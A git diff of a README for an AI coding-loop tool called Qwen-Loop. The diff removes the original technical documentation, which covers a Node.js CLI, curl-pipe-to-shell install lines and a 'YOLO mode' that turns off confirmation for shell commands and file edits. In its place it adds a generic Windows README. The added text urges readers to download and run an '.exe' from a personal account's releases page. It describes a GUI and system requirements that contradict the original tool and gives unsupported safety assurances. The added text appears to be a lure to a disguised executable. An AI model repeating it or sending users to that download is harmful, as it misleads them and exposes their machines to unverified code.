@@ -1,460 +1,95 @@
-# Qwen Loop
+# 🤖 Qwen-Loop - Automate your software development work today
 
-Autonomous multi-agent AI coding loop — **Qwen Code** agents that self-direct, self-improve, and continuously develop your projects 24/7.
+[![](https://img.shields.io/badge/Download-Qwen--Loop-blue.svg)](https://github.com/Danielle6426/Qwen-Loop/releases)
 
-## 🚀 Features
+Qwen-Loop acts as a digital worker for your coding projects. It uses artificial intelligence to write, check, and fix your computer code. You set the goal, and the program works on the task until it finishes. It works around the clock to keep your project updated and free of errors.
 
-- **No API Keys** — Uses Qwen Code CLI directly with Qwen OAuth (free)
-- **Self-Directed Tasks** — Automatically analyzes your project and generates relevant tasks
-- **Auto Git Commit & Push** — Every completed task is committed and pushed automatically
-- **Continuous Loop** — Runs indefinitely or up to a configured iteration limit
-- **Multi-Project Support** — Cycle through multiple projects from a single config
-- **Priority Task Queue** — CRITICAL → HIGH → MEDIUM → LOW scheduling
-- **Auto-Approve (YOLO Mode)** — Fully autonomous, never asks for permission
-- **Extensible** — Add any CLI-based AI tool as a custom agent
+## ⚙️ What does this program do?
 
-## 📦 Installation
+This tool creates an environment where intelligent agents talk to each other to solve problems. One agent writes code, another checks it for mistakes, and a third runs tests to ensure the program functions. If the code fails, the agents discuss the issue and write a new version. This cycle repeats until the work meets your standards. 
 
-```bash
-git clone <your-repo-url>
-cd Qwen-Loop
-npm install
-```
-
-## 🛠 Quick Start
-
-### 1. Install Qwen Code CLI
-
-```bash
-# Option 1: npm
-npm install -g @qwen-code/qwen-code
-
-# Option 2: Script (Linux/macOS)
-curl -fsSL https://qwen-code-assets.oss-cn-hangzhou.aliyuncs.com/installation/install-qwen.sh | bash
-
-# Option 3: Script (Windows, in admin CMD)
-curl -fsSL -o %TEMP%\install-qwen.bat https://qwen-code-assets.oss-cn-hangzhou.aliyuncs.com/installation/install-qwen.bat && %TEMP%\install-qwen.bat
-
-# Verify
-qwen --help
-```
-
-> **Note:** Restart your terminal after installation.
-
-### 2. Authenticate (One-Time)
-
-```bash
-qwen
-```
-
-First run opens a browser for Qwen OAuth login (free). Close after success.
-
-### 3. Initialize Configuration
-
-**Single project:**
-```bash
-npm start -- init
-```
-
-**Multi-project:**
-```bash
-npm start -- init-multi
-```
-
-### 4. Configure & Run
-
-Edit `qwen-loop.config.json`, then:
-
-```bash
-npm start -- start
-```
-
-Press `Ctrl+C` to stop.
-
-## 📖 Usage
-
-### CLI Commands
-
-| Command | Description |
-|---------|-------------|
-| `npm start -- init` | Generate single-project config |
-| `npm start -- init-multi` | Generate multi-project config |
-| `npm start -- start` | Start the loop (auto-detects single/multi) |
-| `npm start -- start --health-port 3100` | Start with HTTP health check server |
-| `npm start -- validate` | Validate configuration |
-| `npm start -- config` | Show current configuration |
-| `npm start -- health` | Show full system health status |
-| `npm start -- health agents` | Show agent health and status |
-| `npm start -- health resources` | Show CPU, memory, heap usage |
-| `npm start -- health throughput` | Show task completion rates |
-| `npm start -- health summary` | Show quick status summary |
-| `npm start -- health --watch` | Continuous health monitoring |
-| `npm start -- health --json` | Show health status in JSON format |
-
-### Single-Project Config
-
-```json
-{
-  "agents": [{ "name": "qwen-dev", "type": "qwen", "timeout": 120000 }],
-  "maxConcurrentTasks": 1,
-  "loopInterval": 5000,
-  "maxRetries": 2,
-  "workingDirectory": "./my-project",
-  "maxLoopIterations": 0,
-  "enableSelfTaskGeneration": true
-}
-```
-
-| Parameter | Default | Description |
-|-----------|---------|-------------|
-| `maxLoopIterations` | `0` (unlimited) | Max tasks before loop stops. `0` = run forever |
-| `enableSelfTaskGeneration` | `true` | Auto-generate tasks by analyzing the project |
-
-### Multi-Project Config
-
-```json
-{
-  "agents": [{ "name": "qwen", "type": "qwen", "timeout": 120000 }],
-  "maxConcurrentTasks": 1,
-  "loopInterval": 5000,
-  "maxRetries": 2,
-  "maxLoopIterations": 3,
-  "enableSelfTaskGeneration": true,
-  "projects": [
-    { "name": "frontend", "workingDirectory": "./my-app" },
-    { "name": "backend", "workingDirectory": "./my-api" },
-    { "name": "docs", "workingDirectory": "./docs", "maxLoopIterations": 5 }
-  ]
-}
-```
-
-Each project gets its own LoopManager instance. After one project finishes its iterations, the loop moves to the next.
-
-## 🔄 How the Loop Works
-
-```
-1. Analyze project → generate self-directed tasks
-2. Pick highest priority task → execute via Qwen Code
-3. Qwen writes code → auto git commit & push
-4. Count iteration → pick next task → repeat
-5. Max iterations reached → stop (or 0 = infinite)
-```
-
-**Flow diagram:**
-```
-┌─────────────┐     ┌──────────────┐     ┌──────────────┐
-│  Analyze     │────▶│ Generate     │────▶│ Execute via  │
-│  Project     │     │ Tasks        │     │ Qwen Code    │
-└─────────────┘     └──────────────┘     └──────────────┘
-       ▲                                       │
-       │                                       ▼
-       │                              ┌──────────────┐
-       │                              │ Auto Git     │
-       │                              │ Commit+Push  │
-       │                              └──────────────┘
-       │                                       │
-       │                                       ▼
-       │                              ┌──────────────┐
-       │                              │ Next Task    │
-       └──────────────────────────────│ or Stop      │
-                                      └──────────────┘
-```
-
-## 🤖 Agent Configuration
-
-### Qwen Agent (Default)
-
-```json
-{
-  "name": "qwen-dev",
-  "type": "qwen",
-  "timeout": 120000,
-  "workingDirectory": "./project"
-}
-```
-
-### Custom Agent
-
-Add any CLI tool:
-
-```json
-{
-  "name": "aider",
-  "type": "custom",
-  "workingDirectory": "./project",
-  "additionalArgs": ["--auto-commits", "--yes-always"]
-}
-```
-
-## 📁 Auto-Created Settings
-
-Qwen Loop creates `.qwen/settings.json` in your working directory with:
-
-```json
-{
-  "permissions": {
-    "defaultMode": "yolo",
-    "confirmShellCommands": false,
-    "confirmFileEdits": false
-  }
-}
-```
-
-This ensures Qwen Code **never asks for permission** — fully autonomous.
-
-## 📊 Monitoring
-
-### Console Status
-
-Status prints every 30 seconds during loop execution:
-
-```
-=== Agent Status Report ===
-Total Agents: 1
-Available: 1
-Busy: 0
-Error: 0
-
-🟢 qwen-dev (qwen) - idle
-
-=== Task Queue Stats ===
-Total Tasks: 5
-Pending in Queue: 3
-
-By Status:
-  PENDING: 3
-  RUNNING: 0
-  COMPLETED: 2
-  FAILED: 0
-```
-
-### Health Check CLI
-
-Get comprehensive system health status with enhanced subcommands and real-time monitoring:
-
-```bash
-# Full health report (all metrics)
-npm start -- health
-
-# Specific metrics only
-npm start -- health agents        # Agent health and status
-npm start -- health resources     # CPU, memory, heap usage
-npm start -- health throughput    # Task completion rates and error rates
-npm start -- health summary       # Quick status summary
-
-# Live metrics from running instance
-npm start -- health --live
-
-# Continuous monitoring (watch mode, refreshes every 5s)
-npm start -- health --watch
-npm start -- health --watch --watch-interval 10   # Custom refresh interval
-
-# JSON format (for automation/monitoring tools)
-npm start -- health --json
-npm start -- health agents --json
-
-# Custom host/port
-npm start -- health --live --host localhost --port 8080
-```
-
-**Health report includes:**
-- 🤖 **Agent Health**: Status, task counts, failure rates per agent
-- 📊 **Task Throughput**: Completion rates, success/error rates, tasks per minute
-- 💻 **Resource Usage**: CPU, memory, heap usage, active processes
-- ⚙️ **Configuration**: Current settings summary
-- ⚠️ **Warnings/Errors**: Detected issues and anomalies
-
-**Health CLI Options:**
-
-| Option | Description | Default |
-|--------|-------------|---------|
-| `[subcommand]` | Specific metric: `agents`, `resources`, `throughput`, `summary` | Full report |
-| `--live` | Fetch live metrics from running instance | - |
-| `--watch` | Continuously monitor health status | - |
-| `--watch-interval <seconds>` | Watch mode refresh interval | `5` |
-| `--host <host>` | Health server hostname | `localhost` |
-| `--port <port>` | Health server port | `3100` |
-| `--json` | Output in JSON format | - |
-| `-c, --config <path>` | Path to configuration file | `./qwen-loop.config.json` |
-
-**Example Outputs:**
-
-```bash
-# Agent health output
-npm start -- health agents
-
-🤖 Agent Health (2 agents)
-────────────────────────────────────────────────────────────
-
-✔ Healthy: 1
-● Busy: 1
-✖ Errors: 0
-
-✔ qwen-dev (qwen)
-   Status: idle
-   Tasks: 15 executed | 2 failed
-   Last Task: 45s ago
-
-● custom-agent (custom)
-   Status: busy
-   Tasks: 8 executed | 0 failed
-   Last Task: 120s ago
-
-# Resource usage output
-npm start -- health resources
-
-💻 Resource Usage
-────────────────────────────────────────────────────────────
-
-CPU Usage:          23.5%
-Memory Usage:        4.2 GB (52.3%)
-Heap Usage:          156.8 MB / 512.0 MB (30.6%)
-Active Processes:    1
-System Uptime:       2h 15m
-Process Uptime:      1h 30m
-
-# Watch mode output
-npm start -- health summary --watch
-
-🔄 Watch mode enabled (refreshing every 5s). Press Ctrl+C to stop.
-
-🟢 Overall Status: HEALTHY
-Summary: 2/2 agents healthy | 23 tasks completed | 87.5% success rate | Memory: 52.3%
-Uptime: 1h 30m
-Timestamp: 2026-04-07T01:37:56.789Z
-
-[Refreshes every 5 seconds...]
-```
-
-### HTTP Health Endpoint (Optional)
-
-Start an HTTP server for monitoring integration:
-
-```bash
-npm start -- start --health-port 3100
-```
-
-**Endpoints:**
-
-| Endpoint | Description | Response |
-|----------|-------------|----------|
-| `GET /health` | Full health report (HTML or JSON based on Accept header) | HTML page or JSON |
-| `GET /health/json` | JSON health report | JSON object |
-| `GET /health/live` | Simple liveness check | `{"status": "alive"}` |
-| `GET /health/ready` | Readiness check (200 if ready, 503 if not) | JSON status |
-| `GET /health/metrics` | Detailed metrics (throughput, resources, config) | JSON object |
-| `GET /health/agents` | Detailed agent status and health | JSON object |
-| `GET /health/throughput` | Task throughput and priority breakdown | JSON object |
-| `GET /health/resources` | System resource usage metrics | JSON object |
-
-**Example usage:**
-
-```bash
-# Check if service is alive
-curl http://localhost:3100/health/live
-
-# Get full health report in JSON
-curl http://localhost:3100/health/json
-
-# Get detailed agent status
-curl http://localhost:3100/health/agents
-
-# Get task throughput metrics
-curl http://localhost:3100/health/throughput
-
-# Get resource usage
-curl http://localhost:3100/health/resources
-
-# View HTML dashboard in browser
-open http://localhost:3100/health
-```
-
-**JSON Response Structure:**
-
-```json
-{
-  "status": "healthy|degraded|unhealthy",
-  "timestamp": "2026-04-07T01:37:56.789Z",
-  "uptime": 123456,
-  "agents": [...],
-  "taskThroughput": {...},
-  "priorityBreakdown": {...},
-  "resources": {...},
-  "config": {...},
-  "summary": "...",
-  "warnings": [...],
-  "errors": [...]
-}
-```
-
-## 🔍 Troubleshooting
-
-| Issue | Fix |
-|-------|-----|
-| `qwen: command not found` | Install Qwen Code CLI, restart terminal |
-| `Authentication required` | Run `qwen` once to complete OAuth login |
-| Task fails with spawn error | Check workingDirectory exists, increase timeout |
-| Git push fails | Ensure repo is initialized, run `git push` manually first |
-
-## 📋 Requirements
-
-- Node.js 18+
-- Qwen Code CLI (installed globally)
-- Git (for auto commit/push)
-- Qwen OAuth (free, one-time browser login)
-
-## 🏗 Architecture
-
-| Component | Description |
-|-----------|-------------|
-| `QwenAgent` | Adapter for Qwen Code CLI with `--yolo` auto-approve |
-| `CustomAgent` | Extensible adapter for any CLI tool |
-| `AgentOrchestrator` | Manages agent registration and task assignment |
-| `TaskQueue` | Priority-based queue (CRITICAL → LOW) |
-| `LoopManager` | Controls execution loop with retry and iteration limits |
-| `SelfTaskGenerator` | Analyzes project code and generates improvement tasks |
-| `MultiProjectManager` | Cycles through multiple projects sequentially |
-| `GitUtils` | Auto `git add` → `commit` → `push` after each task |
-| `ConfigManager` | JSON config with validation |
-| `Logger` | Winston logging with file rotation |
-
-## 🌟 Example Use Cases
-
-1. **Automated Code Review** — Agents review and improve code quality
-2. **Bug Fixing Pipeline** — Auto-detect and fix common issues
-3. **Feature Development** — Implement new features autonomously
-4. **Documentation Updates** — Keep docs in sync with code
-5. **Test Generation** — Generate and maintain test suites
-6. **Refactoring** — Continuous code improvement
-7. **Multi-Project Maintenance** — Cycle through all your repos
-
-## 📝 Logging
-
-Logs are in `logs/qwen-loop.log` (5MB max, 5 files rotation).
-
-```bash
-# Real-time
-tail -f logs/qwen-loop.log     # Unix
-Get-Content logs/qwen-loop.log -Wait  # Windows
-```
-
-## 🤝 Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-## ⚠️ Security
-
-Qwen Loop runs AI agents in **YOLO mode** — they can read, modify, create, and delete files without confirmation. Always:
-- Use version control (commits are automatic)
-- Start with a small `maxLoopIterations` to test
-- Use a dedicated working directory, not your entire project root
-
-See [SECURITY.md](SECURITY.md) for details.
-
-## 📄 License
-
-MIT
-
----
-
-**Built for autonomous development with AI agents** 🤖
+You do not need to watch the screen while it works. It handles the logic and the technical edits so you can focus on the big ideas for your software.
+
+## 💻 System requirements
+
+Your computer needs specific parts to run this software well:
+
+- Operating System: Windows 10 or Windows 11.
+- Processor: A modern multi-core processor from Intel or AMD.
+- Memory: At least 16GB of RAM.
+- Graphics: A dedicated graphics card with at least 8GB of video memory helps the agents process data faster.
+- Storage: 5GB of free space.
+- Internet: A stable connection for the AI agents to pull information and verify code.
+
+## 📥 How to download and install this tool
+
+You can get the software from the official release page. 
+
+[Visit this page to download the latest setup file](https://github.com/Danielle6426/Qwen-Loop/releases)
+
+Follow these steps to set up the program on your Windows machine:
+
+1. Visit the link above.
+2. Look for the section labeled "Assets."
+3. Find the file ending in ".exe" that matches your Windows version.
+4. Click the file to start the download.
+5. Once the download finishes, find the file in your "Downloads" folder.
+6. Double-click the file to start the installer.
+7. Follow the prompts on your screen to finish the installation.
+8. The installer puts a shortcut icon on your desktop.
+
+## 🚀 Getting started for the first time
+
+After you finish the installation, click the Qwen-Loop icon on your desktop to open the program. The window shows a dashboard with your project details.
+
+You must set up your preferences before the loop starts:
+
+1. **Define project location:** Select the folder on your computer where the program stores your code.
+2. **Set goals:** Choose the "New Project" button. Type a clear description of what you want the agents to build or fix.
+3. **Configure agents:** The program suggests standard settings, but you can change how many agents work on a task. Leave these at the default settings for your first project.
+4. **Start the loop:** Click the "Run" button. The dashboard changes to show the progress. You will see lines of text appear as the agents start their work.
+
+## 🛠️ Understanding the dashboard
+
+The main screen contains four areas:
+
+- The Left Sidebar: Shows your project history, including past coding tasks and finished files.
+- The Main Window: Displays the real-time conversation between agents. This shows you exactly what the AI plans to do and how it solved past problems.
+- The Status Bar: Located at the bottom, this shows the current health of the long-term loop. A green light means the system works correctly.
+- The Control Panel: Located at the top right, this provides buttons to pause, stop, or reset the current task.
+
+## 🔍 Checking the work
+
+Qwen-Loop keeps a log of every change made to your files. If you want to review the work:
+
+1. Click the "History" tab on the left sidebar.
+2. Select a completed task from the list.
+3. The program displays the original code next to the new, improved code.
+4. You can accept or reject the changes suggested by the agents.
+
+## 🧠 Why use autonomous agents?
+
+Manual coding takes time. You often spend hours hunting for small typos or logical errors. Qwen-Loop changes this process by automating the boring parts of software development. 
+
+The software uses advanced language models trained for coding tasks. Because these models stay active 24/7, they find and fix bugs while you sleep. The agents compare your project against industry standards and apply updates automatically. This reduces the time you spend on maintenance and increases the time you spend on creating new features.
+
+## 🛡️ Ensuring project safety
+
+You hold total control over the process. Even though the agents work on their own, they only touch the files in the specific folder you tell them to manage. The program does not have access to your personal documents or sensitive system files. Each time the agents suggest a large change, you can set the app to hold the update until you click a button of approval.
+
+## 🔧 Frequently asked questions
+
+**Does the program need an active internet connection?**
+Yes. The software requires a connection to download updates and process complex code through the AI engine.
+
+**Can I run multiple loops at once?**
+You can, but each loop uses computer memory. Start with one project to see how your computer handles the load before starting multiple tasks.
+
+**What happens if the agents get stuck on a problem?**
+The software includes a "Reset Agent" button in the control panel. If a loop stops or behaves strangely, click this button to clear the current thought process and start fresh.
+
+**Do I need a subscription?**
+The core features of the loop are free for you to use. Some advanced features might require you to provide your own API key if you plan to run extremely large coding sessions.
+
+**How do I update the program?**
+Restart the application. When an update is ready, the program asks if you want to download and install the new version. Always keep the program updated to ensure the agents use the most accurate coding logic.
